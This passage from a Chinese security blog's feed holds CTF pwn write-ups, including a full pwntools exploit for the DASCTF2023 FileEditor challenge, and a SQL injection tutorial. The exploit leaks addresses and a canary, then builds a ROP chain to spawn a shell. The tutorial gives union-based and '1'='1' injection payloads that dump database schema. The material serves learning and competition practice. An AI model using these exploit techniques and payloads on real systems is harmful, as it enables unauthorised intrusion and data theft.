class="line">write(fini+i,k)</span><br><span class="line">write(flag_addr,<span class="number">0xff</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Not-solve："><a href="#Not-solve：" class="headerlink" title="Not solve："></a>Not solve：</h3><p>记得在pwnable上3x17这道题xuanxuan的博客中好像说的是静态链接会调用fini，这道题不知道为什么，有大师傅说是ida里面看不出来自己去si一步步看看到exit中call了fini，后续要多研究一下</p><h2 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h2><p>感谢T1d师傅分享的方法</p><p><a href="https://he.tld1027.com/2023/07/30/nssctf-round14-pwn%e4%b8%93%e9%a1%b9-wp/">T1d</a></p><p>我觉得属于是逻辑漏洞，很好的一道题</p>]]></content>
      
      
      
        <tags>
            
            <tag> practice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2023_FileEditor</title>
      <link href="/2023/07/26/DASCTF2023-FileEditor/"/>
      <url>/2023/07/26/DASCTF2023-FileEditor/</url>
      
        <content type="html"><![CDATA[<p>bilibiliwold让我错过了dasctf和巅峰极客(估计去了也是被虐555)，回来之后植物大战僵尸玩累了就写了一会儿题，感觉这个题挺考验逆向的，题目并没有多难，细心就好(</p><p>刚进去连main函数都找不到(难绷，不过我们可以通过init函数找到入口</p><p><img src="/../images/1690339686406.png" alt="1690339686406"></p><p>在这个函数中，我们发现可以把堆上的内容复制到栈上，然后利用find函数，就可以把我们需要的信息打出来</p><p><img src="/../images/6fc9771664a77eb22d4b17d7d9d5d190.png" alt="img"></p><p>比如这里我们就可以泄露puts的地址，findstring就会给我们打出来，同时我们也可以利用show来打，都可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">menu=<span class="string">&quot;&gt; choose:&quot;</span></span><br><span class="line"><span class="keyword">if</span> debug==<span class="number">1</span>:</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b$rebase(0x2154)&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sc</span>(<span class="params">choice</span>):</span><br><span class="line">p.recvuntil(menu)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open</span>():</span><br><span class="line">sc(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">sc(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">content,n,m=<span class="number">1</span></span>):</span><br><span class="line">sc(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; To insert m lines before line n, please enter n m:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(n))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(m))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; Please enter the content to be inserted in sequence:&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">m=<span class="number">1</span>,n=<span class="number">1</span></span>):</span><br><span class="line">sc(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; Please enter the starting line (m) and the number of lines to delete (n):&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(m))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">payload</span>):</span><br><span class="line">sc(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; Please enter the string to search for:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">sc(<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;modified:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;new content:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save</span>():</span><br><span class="line">sc(<span class="number">9</span>)</span><br><span class="line"><span class="built_in">open</span>()</span><br><span class="line"></span><br><span class="line">payload=payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x37</span>+<span class="string">b&#x27;b&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">47</span>+<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line">insert(payload,<span class="number">1</span>)</span><br><span class="line">find(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaab&#x27;</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x8459a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">binsh=libc_base+libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; Do you want to continue searching? (y/n)&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3f</span>+<span class="string">b&#x27;b&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">39</span>+<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">find(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaab&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaab&#x27;</span>)</span><br><span class="line">pro_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x2a60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;searching? (y/n)&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x67</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">show()</span><br><span class="line">pop_rdi=pro_base+<span class="number">0x2ac3</span></span><br><span class="line">ret=pro_base+<span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aaab&#x27;</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x0a</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x68</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment">#find(&#x27;c&#x27;)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> practice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLearning</title>
      <link href="/2023/07/25/WebLearning/"/>
      <url>/2023/07/25/WebLearning/</url>
      
        <content type="html"><![CDATA[<h1 id="WebLearning"><a href="#WebLearning" class="headerlink" title="WebLearning"></a>WebLearning</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>本文参考探姬姐姐的文章，文章中均添加个人理解，若有错误请大佬联系我更正</p><p><a href="https://ctf.tj.cn/">click here</a> </p><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><p>sql注入是一种通过前端输入来在后端服务器执行恶意代码的攻击方式</p><blockquote><p>SQL注入的本质是后台SQL语句使用了拼接查询，未对用户输入的数据作安全处理</p></blockquote><p><strong>SQL注入的分类</strong> </p><ul><li>数字型注</li><li>字符型注</li><li>搜索形注</li></ul><p><strong>请求方法不同，可分为</strong></p><ul><li>$_GET</li><li>$_POST</li><li>$_HEADER</li></ul><p><strong>注入点不同，可分为</strong> </p><ul><li>列注入</li><li>表注入</li><li>order注入</li><li>limit注入</li><li>group by注入</li></ul><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><h4 id="判断表的个数"><a href="#判断表的个数" class="headerlink" title="判断表的个数"></a>判断表的个数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM db.user where id=1 order by 2</span><br></pre></td></tr></table></figure><p>chatgpt:该查询将返回db.user表中id等于1的行，并按照第二列的值进行排序。</p><p><a href="https://www.runoob.com/sql/sql-orderby.html">关于orderBy语法</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">ORDER BY column1, column2, ... ASC|DESC;</span><br></pre></td></tr></table></figure><h4 id="获取数据库的库名"><a href="#获取数据库的库名" class="headerlink" title="获取数据库的库名"></a>获取数据库的库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(schema_name) from information_schema.schemata;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>什么是schema</strong> </p><blockquote><p>schema:汉语意思为提要，纲要。</p></blockquote><p>在mysql中，schema＝database</p><p><strong>information_schema</strong> </p><p><a href="https://blog.csdn.net/kikajack/article/details/80065753">information_schema</a></p><p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。<br>information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p><p><strong>group_concat(schema_name)</strong> </p><p>MySQL <code>GROUP_CONCAT()</code> 函数将组中的字符串连接成为具有各种选项的单个字符串。</p><h4 id="猜解数据库表名"><a href="#猜解数据库表名" class="headerlink" title="猜解数据库表名"></a>猜解数据库表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database()</span><br><span class="line">1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database()</span><br><span class="line"># 后台执行为：</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>假设有某个数据库的查询语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;$username&#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure><p>字符型注入要注意构建 <strong>闭合</strong> </p><blockquote><p> <strong>闭合</strong> ：通过伪造符号来让select语句错误执行</p></blockquote><p>在上述语句中，我们可以让 <code>username= 1&#39;or&#39;1&#39;=&#39;1&#39;--</code></p><p>效果为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; -- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure><p>其中 <code>&#39;1&#39;=&#39;1&#39;</code>是用真的，所以where的查询语句是成立的，就会把所有的信息都打出来</p><p>其余的方式与数字型注入差不多</p><ul><li><p>判断列数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 1-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 2-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 3-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 4-- &#x27; AND password=&#x27;$password&#x27;; # 报错</span><br></pre></td></tr></table></figure></li><li><p>库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union SELECT 1,schema_name,2 FROM information_schema.schemata;-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database()-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
